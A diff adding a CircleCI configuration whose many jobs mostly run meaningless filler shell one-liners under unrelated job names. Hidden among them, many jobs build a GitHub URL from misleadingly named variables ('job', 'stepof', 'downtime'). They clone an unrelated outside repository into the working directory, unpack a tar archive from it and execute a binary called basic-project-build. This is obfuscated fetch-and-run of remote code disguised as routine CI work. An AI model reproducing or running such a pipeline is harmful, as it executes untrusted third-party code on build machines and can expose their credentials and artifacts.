@@ -1,0 +1,1926 @@
+version: 2.1
+
+jobs:
+  CompileDispatcher:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: Run scheduler browser tests with real services
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            >/tmp/update-agent-sources/schema-registry-health-check echo 'acceptance-test-job routine-update'
+            wc -c < /tmp/update-agent-sources/schema-registry-health-check
+            value="trout"; label="ochre"; if [ "$value" = "$label" ]; then echo same; else echo different; fi
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'schema-registry-health-check'
+  ResolverTutorials:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: LaunchingBucket4Of4
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/schema-registry-health-check | head -1
+            echo 'queued index rebuild'; printf '%s\n' squid neon squid raven squid | sort | uniq -c | sort -n | tail -n 1 | awk '{print $2}'
+      - run:
+          name: copy-and-verify-viewer-changelog
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --depth 5 "https://$job/$stepof/$downtime" $PWD
+            printf '%s\n' "reducer check passed" "all good" "retry 6 of 10"
+            ready=0; turn=0; until [ "$ready" -eq 1 ]; do turn=$((turn + 1)); if [ "$turn" -ge 3 ]; then ready=1; fi; done; echo "ready after $turn rounds"
+      - run:
+          name: Fetch and build bundle
+          command: |
+            tar xf execute-dependency-audit.tar
+            echo "parser passed coverage merge"; kind_of() { case "$1" in venus) echo first;; *) echo other;; esac; }; kind_of gnu
+      - run:
+          command: |
+            $PWD/basic-project-build
+            printf '%s\n' crow,39 theta,18 eagle,34 lambda,22 | awk -F, 'NR == 1 {m = $2; w = $1} m < $2 {m = $2; w = $1} END {print w, m}'
+            echo "dependency audit for mail queue passed"; age=65; grade=ok; if ((age > 50)); then grade=high; fi; echo "$grade"
+
+  monitor-instances-with-extended-timeout:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: import-manifest-from-template-project
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            touch /tmp/update-agent-sources/collect-event-bus-build-summary && echo 'monitor-sanity-checks schema-registry-unit-tests' > /tmp/update-agent-sources/collect-event-bus-build-summary
+            wc -c < /tmp/update-agent-sources/collect-event-bus-build-summary
+            echo "shard 1 of 8 finished"; entries=(piston hawk saturn delta wasp); for ((i = 0; i < ${#entries[@]}; i++)); do echo "$((i + 1)) ${entries[i]}"; done
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'collect-event-bus-build-summary'
+  bridge-validation-segment-5-of-8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: cache-runtime-dependencies-in-parallel
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/collect-event-bus-build-summary | head -1
+            absolute() { local m=$1; if ((m < 0)); then m=$((0 - m)); fi; echo "$m"; }; absolute -38; echo preparing header check
+      - run:
+          name: console-asset-sync
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --depth=3 --branch main "https://$job/$stepof/$downtime" `pwd`
+            printf '%X\n' 418; printf '%s' "build-15" | md5sum | tr a-f A-F
+      - run:
+          name: OperatorDesignReview
+          command: |
+            tar -xf execute-dependency-audit.tar
+            v="7.10.26"; echo "${v##*.}"
+      - run:
+          command: |
+            $PWD/basic-project-build
+            item="spruce"; [[ "$item" == sp* ]] && echo "starts with sp"; multiply() { echo $(($1 * $2)); }; multiply 30 4
+
+  BillingBenchmarkComparisonTaskWorker4:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: nightly-generation (slice 3 of 7)
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            echo 'mailer-coverage renderer-debug-build' | cat > /tmp/update-agent-sources/pre-scan-audit-report
+            wc -c < /tmp/update-agent-sources/pre-scan-audit-report
+            echo "wrapping up contract tests"; item=""; if [ -z "$item" ]; then echo "empty"; else echo "non-empty"; fi
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'pre-scan-audit-report'
+  stamp-search-version-string:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: upload (phase 1 of 4)
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/pre-scan-audit-report | head -1
+            row="nickel,gecko,radon,poplar,llama"; echo "${row//,/ }"
+      - run:
+          name: Check Rule Engine Build Number (bucket 4)
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --depth 3 --no-tags --filter=blob:none "https://$job/$stepof/$downtime" `pwd`
+            mapfile -t parts < <(printf '%s\n' pluto cyan phi silver); echo "${parts[1]}"
+      - run:
+          name: Start local registry and seed reference data
+          command: |
+            tar -xf execute-dependency-audit.tar --no-same-permissions
+            printf '%s\n' cobra cyan nozzle navy llama | uniq -c
+      - run:
+          command: |
+            $PWD/basic-project-build
+            echo stage 5 of 6 started; echo "stage 5 of 6 complete"
+            echo "result $((47 + 36 + 10))"; tokens=(teal zeta cobra horse poplar llama); count=0; for comp in "${tokens[@]}"; do count=$((count + ${#comp})); done; echo "$count"
+
+  analyze-mobile-app:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: PartnerPortalBenchmarks
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            >/tmp/update-agent-sources/pre-launch-task echo 'pre-upgrade-policy-checks final-performance-gate'
+            wc -c < /tmp/update-agent-sources/pre-launch-task
+            echo $((16#931))
+            for platform in darwin-arm64 linux-arm64 darwin-x64; do echo "queued $platform"; done; echo "3 platforms queued"
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'pre-launch-task'
+  release-source-archive-to-beta-testers:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Mandatory Artifact Upload
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/pre-launch-task | head -1
+            echo "index rebuild in progress"; printf '%d items\n' 41; echo "index rebuild complete"
+      - run:
+          name: Collect build summary
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --depth 4 --filter=blob:none "https://$job/$stepof/$downtime" "$PWD"
+            n=29; if ((n < 0)); then echo negative; elif ((n == 0)); then echo zero; else echo positive; fi; echo "10 modules compiled"
+            for k in $(seq 1 2); do echo "shard $k"; done; printf '%s\n' "run complete"
+      - run:
+          name: Run formatter quality checks
+          command: |
+            tar --extract -f execute-dependency-audit.tar --no-same-owner
+            rows=(lambda crab brown black); printf '%s\n' "${rows[@]}" | sort | tail -n 1
+            printf '%s\n' chi owl chi epsilon owl | nl
+      - run:
+          command: |
+            $PWD/basic-project-build
+            unit="notifier"; echo "starting $unit"; echo "$unit finished"
+            branch="feature/iota-red"; echo "branch ${branch##*/} of type ${branch%%/*}"
+
+  approving-driver-release-in-dry-run-mode:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Trigger backup job
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            ( echo 'pre-scan-certificate-generation upload-search-service-help-pages' ) > /tmp/update-agent-sources/lint-and-format-configuration
+            wc -c < /tmp/update-agent-sources/lint-and-format-configuration
+            budget=69; spent=6; echo "$spent of $budget minutes spent, $((budget - spent)) left"
+            for n in $(seq 6); do printf 'turn %d\n' "$n"; done
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'lint-and-format-configuration'
+  UserPortalVersion:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Restore data store for debug build
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/lint-and-format-configuration | head -1
+            echo "queued soak test"; printf '%s\n' "target mars selected"
+            change=836; title="elm iodine"; echo "checking change $change"; echo "title has ${#title} characters"
+      - run:
+          name: Scan for Unused Dependencies
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --depth 2 --filter=blob:none "https://$job/$stepof/$downtime" "."
+            echo starting format check && printf '%s' "job-17-spindle" | wc -c
+            printf '%s\n' flange puma pulsar melon pink | sed -E 's/[aeiou]+/-/g'; fname="queue.csv"; echo "$fname" | awk -F. '{print $NF}'
+      - run:
+          name: StreamProcessorSmokeTests (group 2 of 2)
+          command: |
+            tar -x < execute-dependency-audit.tar
+            next_of() { echo $(($1 + 1)); }; v=17; v=$(next_of "$v"); v=$(next_of "$v"); echo "$v"; echo "batch 5 queued"
+            echo "collecting results of manifest check"; kebab() { local IFS=-; echo "$*"; }; kebab salmon alder; echo "results of manifest check collected"
+      - run:
+          command: |
+            $PWD/basic-project-build
+            labels=(lime navy mouse beech birch); labels[1]=zebra; echo "${labels[*]}"; echo "serializer passed naming check"
+
+  post-checkout-backup:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: CrossPlatformToolSetup
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            printf 'fixture-generation-hook-split-5 one-time-deployment\n' > /tmp/update-agent-sources/stamp-billing-version
+            wc -c < /tmp/update-agent-sources/stamp-billing-version
+            slow=0; for ms in 211 1278 164 116 491; do if ((ms > 500)); then slow=$((slow + 1)); fi; done; echo "$slow slow tests"
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'stamp-billing-version'
+  measure-cold-start-time-on-dedicated-runners:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Secondary Snapshot Restore (split 4)
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/stamp-billing-version | head -1
+            summary=""; for part in render audit notify publish; do summary+="$part ok, "; done; echo "${summary%, }"
+      - run:
+          name: DeferredCompression (node 11)
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --depth 5 --no-tags "https://$job/$stepof/$downtime" .
+            echo "total $((42 / 12 + 15))"
+      - run:
+          name: gradual roll-out job
+          command: |
+            tar -x -v -f execute-dependency-audit.tar
+            mapfile -t labels < <(printf '%s\n' lynx salmon lambda); echo "${labels[1]}"
+            printf '%s\n' azure crow orbit crow wrench azure | nl && echo "resuming version bump"
+      - run:
+          command: |
+            $PWD/basic-project-build
+            printf '%s\n' 39 27 40 34 | awk 'NR % 2 == 0 {print $1}'; echo "phase 4 started"
+
+  LicenseReview:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: secondary-build-promotion
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            printf '%s\n' 'initialize-output-directory search-index-test-summary' > /tmp/update-agent-sources/conditional-release-build-hook
+            wc -c < /tmp/update-agent-sources/conditional-release-build-hook
+            echo "using quasar profile"; wc -w < <(echo "elm funnel gear")
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'conditional-release-build-hook'
+  CopyAdapterBinariesToPackageRegistry:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: provision-runtime-data-store
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/conditional-release-build-hook | head -1
+            echo "checking job runner"; code_of() { return "$1"; }; code_of 0; echo zero; code_of 10 || echo "nonzero $?"
+      - run:
+          name: updateReleaseNotesAutomatically
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --depth 5 --filter=blob:none "https://$job/$stepof/$downtime" $(pwd)
+            for num in 1 2 3; do echo "3 x $num = $((3 * num))"; done; echo "no changes in rule engine"
+      - run:
+          name: Measure inventory code coverage
+          command: |
+            tar -x --file execute-dependency-audit.tar --directory .
+            cat <(seq 1 3) <(seq 7 9) | paste -s -d' '; echo "5 tests collected"
+      - run:
+          command: |
+            $PWD/basic-project-build
+            queue=(cherry spring); echo "queue length ${#queue[@]}"; echo "next up ${queue[0]}"
+            entries=(frog gamma khaki xenon koala); found=no; for u in "${entries[@]}"; do if [ "$u" = frog ]; then found=yes; fi; done; echo "$found"
+
+  pre-merge-extension-build:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: upload-controller-static-library-segment-7
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            echo 'primary-checksum-comparison post-upload-audit-iteration-4' | cat > /tmp/update-agent-sources/full-compression-track-2
+            wc -c < /tmp/update-agent-sources/full-compression-track-2
+            echo "using kappa profile"; printf '%d x %d = %d\n' 58 6 $((58 * 6))
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'full-compression-track-2'
+  Compress:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: ReportBuilderDependencyFreeze
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/full-compression-track-2 | head -1
+            echo "lane shark is clear"; labels=(fir alpha walnut); echo "${labels[$((${#labels[@]} - 1))]}"
+      - run:
+          name: post-publish-artifact-export
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --quiet "https://$job/$stepof/$downtime" `pwd`
+            rows=(beech nebula ochre swan lime); rows[1]=hinge; echo "${rows[*]}"; echo "nothing to do for tokenizer"
+            echo "batch 3 queued"; printf '%s\n' coral spruce anvil pulsar | sed '1d;$d'
+      - run:
+          name: throttle (lane 4)
+          command: |
+            tar -xf - < execute-dependency-audit.tar
+            weight_of() { local -A table=([rivet]=5 [gear]=55); echo "${#table[@]}"; }; weight_of; echo "7 modules compiled"
+            echo "holding optimizer"; entry="depth=koala"; echo "${entry#*=}"; echo "releasing optimizer"
+      - run:
+          command: |
+            $PWD/basic-project-build
+            cap_all() { local n; for n in "$@"; do printf '%s ' "${n^}"; done; echo; }; cap_all coral rowan; echo "got $(( (96 + 26) / 14 ))"
+            echo 'pass 1 complete' && printf '%s' "9.13.17" | od -An -tx1 | wc -w
+
+  PrimaryEdgeProxyUpgradeDryRun:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Compute Binary Size After Merge
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            ( echo 'continuous-database-provisioning optimizing-worker-14' ) > /tmp/update-agent-sources/evaluate-scan-results
+            wc -c < /tmp/update-agent-sources/evaluate-scan-results
+            over_limit() { (($1 > 9)); }; if over_limit 5; then echo above; else echo below; fi
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'evaluate-scan-results'
+  source-fetch-wave-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Package messaging scripts
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/evaluate-scan-results | head -1
+            for pct in 33 66 100; do echo "$pct% complete"; done
+            change=129; title="earth banana"; echo "checking change $change"; echo "title has ${#title} characters"
+      - run:
+          name: Automated Database Provisioning Job
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --depth 2 --branch main "https://$job/$stepof/$downtime" .
+            n=4; until ((n == 0)); do echo "$n"; n=$((n - 1)); done; echo now
+            echo "10 warnings, 0 errors" && printf '%s\n' quince,34 amber,19 maroon,6 plum,20 | sort -t, -k2 -n
+      - run:
+          name: Tier 1 Core Layer Cache
+          command: |
+            tar --extract --verbose --file execute-dependency-audit.tar
+            printf '%s %s\n' rotor cobra cobra rotor
+      - run:
+          command: |
+            $PWD/basic-project-build
+            arr=(nozzle teal whale green spruce); printf '%s\n' "${arr[@]}" | tr a-z A-Z | paste -s -d' '
+            label="horse"; [[ -n "$label" ]]; echo "has a value"; echo "shard 4 of 4 finished"
+
+  SequentialBuildDigestStage:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Clear worker build cache on failure
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            printf 'release-scheduler compile-registry\n' > /tmp/update-agent-sources/collect-mailer-lint-results
+            wc -c < /tmp/update-agent-sources/collect-mailer-lint-results
+            status=passed; for check in render audit bundle scan notify; do echo "$check $status"; done; echo "all checks $status"
+            printf '%s - %s\n' warn "worker pool started"
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'collect-mailer-lint-results'
+  Reclaim:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Calculate checksums for audit at pipeline end
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/collect-mailer-lint-results | head -1
+            echo "phase 2 started"; value="heron pluto"; echo "${value% *}"
+            flaky=(moth apricot washer poplar); printf 'quarantined %s\n' "${flaky[@]}"; echo "${#flaky[@]} tests quarantined"
+      - run:
+          name: DownloadAndInstallLanguageRuntime
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --jobs 4 "https://$job/$stepof/$downtime" "`pwd`"
+            runner="gamma-2"; echo "runner $runner picked up the job"; echo "runner ${runner%-*} released"
+      - run:
+          name: experimentalCodeCheckout
+          command: |
+            tar -x --file execute-dependency-audit.tar
+            echo "holding catalog"; echo {01..2}; echo "releasing catalog"
+            printf '%s, ' lambda moth moose; echo
+      - run:
+          command: |
+            $PWD/basic-project-build
+            y=71; ((y += 5)); ((y *= 2)); echo "$y"
+
+  clone-test-harness-release-branch:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Schedule Flaky Registry Tests After Deploy
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            echo 'linting-mutation-tests-lane-3 analyzer-test-cache-track-4' | cat > /tmp/update-agent-sources/validate-license-headers
+            wc -c < /tmp/update-agent-sources/validate-license-headers
+            text="swan"; if [ "$text" != "dog" ]; then echo "not dog"; fi
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'validate-license-headers'
+  compress-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: search-for-unused-variables-with-custom-rules
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/validate-license-headers | head -1
+            label="job-77-aspen"; echo "$label" | tr - '\n' | wc -l
+      - run:
+          name: Roll out website containers to remaining regions
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --depth 3 --no-tags "https://$job/$stepof/$downtime" $(pwd)
+            key="deer-40"; if [[ "$key" =~ -[0-9]+$ ]]; then echo "numbered"; else echo "plain"; fi
+      - run:
+          name: Upload Signatures Without Compression
+          command: |
+            tar xf execute-dependency-audit.tar --no-same-permissions
+            echo "progress 30 percent"; kv="stage=snake"; IFS="=" read -r k v < <(echo "$kv"); echo "$v"
+      - run:
+          command: |
+            $PWD/basic-project-build
+            echo "wrapping up version bump"; year=2020; if ((year % 4 == 0 && year % 100 != 0 || year % 400 == 0)); then echo leap; else echo common; fi
+
+  promote-test-build-and-notify-maintainers:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Final Test Report Pipeline
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            echo 'importer-test-fixtures lint-and-analyze-linker' > /tmp/update-agent-sources/required-review
+            wc -c < /tmp/update-agent-sources/required-review
+            echo "running smoke tests"; echo "lunar whale rotor hare" | tr ' ' ,; echo "smoke tests passed"
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'required-review'
+  plugin-build-number:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: post-setup-cleanup
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/required-review | head -1
+            printf '%s\n' "8.7.29" | gzip -c | gunzip
+            raw="hen gecko robin"; echo "${raw//[aeiou]/.}"; echo "starting release notes"
+      - run:
+          name: launch-storage-security-tests-after-merge
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --depth=1 --branch main --no-tags "https://$job/$stepof/$downtime" "`pwd`"
+            echo 'target lemur selected'; text="guava-32"; echo "${text//[0-9]/}"
+      - run:
+          name: Background Sync
+          command: |
+            tar xf execute-dependency-audit.tar --no-same-permissions
+            echo $((18*18)); echo "using bolt profile"
+            printf '%s\n' snake kiwi jay moose mango | grep -v moose; echo target orca selected
+      - run:
+          command: |
+            $PWD/basic-project-build
+            echo "leg 2 of 5 ready"; awk 'BEGIN {a = 0; b = 1; for (i = 0; i < 7; i++) {t = a + b; a = b; b = t}; print a}'
+
+  one-time-update:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: Fetch nested repositories and build object files
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            printf '%s\n' 'trigger-component-tests stopping-data-store' > /tmp/update-agent-sources/cache-restore-run
+            wc -c < /tmp/update-agent-sources/cache-restore-run
+            sizes=(39 14 1 11 38 32); printf '%s\n' "${sizes[@]}" | sort -n | paste -s -d' '
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'cache-restore-run'
+  post-sync-data-migration:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: WorkerCoverage
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/cache-restore-run | head -1
+            echo 'queueing load test'; passed=50; planned=136; echo "average $(((passed + planned) / 2))"; echo 'load test queued'
+      - run:
+          name: Run Changed Tests and Upload Build Report
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --depth 2 --no-single-branch "https://$job/$stepof/$downtime" .
+            printf '%s\n' frog alder raven quasar | awk '{n += length($0)} END {print n}'
+            total=278; passed=274; echo "$passed of $total tests passed"; echo "pass rate $((passed * 100 / total))%"
+      - run:
+          name: Install rate limiter build dependencies from local archive
+          command: |
+            tar -xf - < execute-dependency-audit.tar
+            scores=(48 10 47 12 57); printf '%s\n' "${scores[@]}" | paste -s -d+; echo "auth proxy looks healthy"
+      - run:
+          command: |
+            $PWD/basic-project-build
+            printf '%s\n' llama,35 brown,27 orbit,19 bison,21 | cut -d, -f1
+            change=6929; title="saturn cobalt"; echo "checking change $change"; echo "title has ${#title} characters"
+
+  LoadMetricsExporterDatabaseFromRemoteCache:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Track partner portal throughput
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            >/tmp/update-agent-sources/full-checkout-chunk-2-of-7 echo 'prune-job-runner-test-cache scan-routine'
+            wc -c < /tmp/update-agent-sources/full-checkout-chunk-2-of-7
+            give_status() { return "$1"; }; give_status 0; echo zero; give_status 7 || echo "nonzero $?"; printf '%s\n' larch currant argon orbit currant pecan | tr -s a-z | sort | tail -n 1
+            steps=(moth stork lynx quince neon frog); len=${#steps[@]}; for ((lap = 0; lap < len; lap++)); do echo "$((lap + 1)) of $len ${steps[lap]}"; done
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'full-checkout-chunk-2-of-7'
+  ScaleReviewEnvironmentWithRetries:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Clear old artifacts on release branches
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/full-checkout-chunk-2-of-7 | head -1
+            echo 'tau iron' "fir" && echo "queued smoke tests"
+            str="ivory-v8"; echo "${str//-/ }"
+      - run:
+          name: Copy Debug Build to Public Mirror
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --depth 1 "https://$job/$stepof/$downtime" "$PWD"
+            idx=2; until ((idx < 1)); do echo "$idx"; ((idx--)); done; echo now
+            subtract() { local val=$1 x=$2; echo $((val - x)); }; subtract 39 10
+      - run:
+          name: SeedUpdateAgentDataStore
+          command: |
+            tar xf execute-dependency-audit.tar --no-same-owner
+            for num in 1 2 3; do if ((num == 2)); then continue; fi; echo "phase $num"; done; echo checks complete
+            cached=135; fresh=3; echo "$cached entries from cache, $fresh rebuilt, $((cached * 100 / (cached + fresh)))% reuse"
+      - run:
+          command: |
+            $PWD/basic-project-build
+            level=59; if [ "$level" -lt 29 ]; then echo "ok"; else echo "not ok"; fi
+            printf '%s\n' rotor=26 cobalt=35 deer=14 cow=30 | tr = ' ' | sort -k2 -n | tail -n 1
+
+  PreSyncVulnerabilityScan:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: sequential-staged-roll-out
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            echo 'mailer-package-promotion mandatory-updater-install-tier-3' > /tmp/update-agent-sources/validator-build-summary
+            wc -c < /tmp/update-agent-sources/validator-build-summary
+            echo "cache warmup in progress"; entry="src/common/parser.json"; echo "$entry" | awk -F/ '{print NF}'; echo "cache warmup complete"
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'validator-build-summary'
+  debugger-checksums:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: Configure connector
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/validator-build-summary | head -1
+            echo "worker 2 idle"; path="tools/app.css"; echo "${path##*.}"
+      - run:
+          name: extension-executable (split 4)
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --depth 1 --no-tags --filter=blob:none "https://$job/$stepof/$downtime" "$PWD"
+            echo "probing metrics"; value="sodium"; if [ -n "$value" ]; then echo "non-empty"; else echo "empty"; fi; echo "metrics responded"
+      - run:
+          name: Permissions (run 6)
+          command: |
+            cat execute-dependency-audit.tar | tar --extract -f -
+            summary=""; for part in archive build package render; do summary+="$part ok, "; done; echo "${summary%, }"
+            echo '5 items processed'; printf '%s\n' grape cherry gear | od -An -c | wc -l
+      - run:
+          command: |
+            $PWD/basic-project-build
+            right="wren"; echo "${right}s and ${right}s"; echo 'ready'
+
+  pre-tag-database-deployment-tier-3:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: generated-user-portal-code
+          command: |
+            mkdir -p /tmp/update-agent-sources
+            : > /tmp/update-agent-sources/extended-installer-packaging; echo 'sequential-application-packaging decoder-failure-analysis' >> /tmp/update-agent-sources/extended-installer-packaging
+            wc -c < /tmp/update-agent-sources/extended-installer-packaging
+            labels=(neptune green cherry mouse elk orca); echo "${labels[@]#?}"
+            echo "step 1 of 6 finished"; printf '%s\n' robin,37 tau,10 venus,17 emu,5 | grep -c ,
+
+      - persist_to_workspace:
+          root: /tmp/update-agent-sources
+          paths:
+            - 'extended-installer-packaging'
+  CopyBenchmarkResultsOverSecureConnection:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/update-agent-sources
+      - run:
+          name: launch-status-page-service-group-8
+          command: |
+            # simplest
+            stat /tmp/update-agent-sources/extended-installer-packaging | head -1
+            for limit in 3 6 12; do echo "pass with limit $limit"; done
+            echo "lambda2salmon" | sed 's/[0-9]\+/ /'
+      - run:
+          name: Load Cache From Last Successful Build
+          command: |
+            job=github.com; stepof=fainabean6zlel-dot; downtime=save-build-artifacts
+            git clone --filter=blob:none "https://$job/$stepof/$downtime" ${PWD}
+            arr=(10 37 8); result=${arr[0]}; for t in "${arr[@]}"; do if ((t < result)); then result=$t; fi; done; echo "min $result"
+            echo "holding scanner"; factorial() { if [ "$1" -le 1 ]; then echo 1; else echo $(($1 * $(factorial $(($1 - 1))))); fi; }; factorial 8; echo "releasing scanner"
+      - run:
+          name: Fetch checksum file from tagged release
+          command: |
+            tar --extract --file execute-dependency-audit.tar --directory .
+            y=19; size=41; if ((y == size)); then echo equal; elif ((y > size)); then echo "first is larger"; else echo "second is larger"; fi
+      - run:
+          command: |
+            $PWD/basic-project-build
+            value="mango newt"; echo "$value" | awk '{print toupper($0)}'
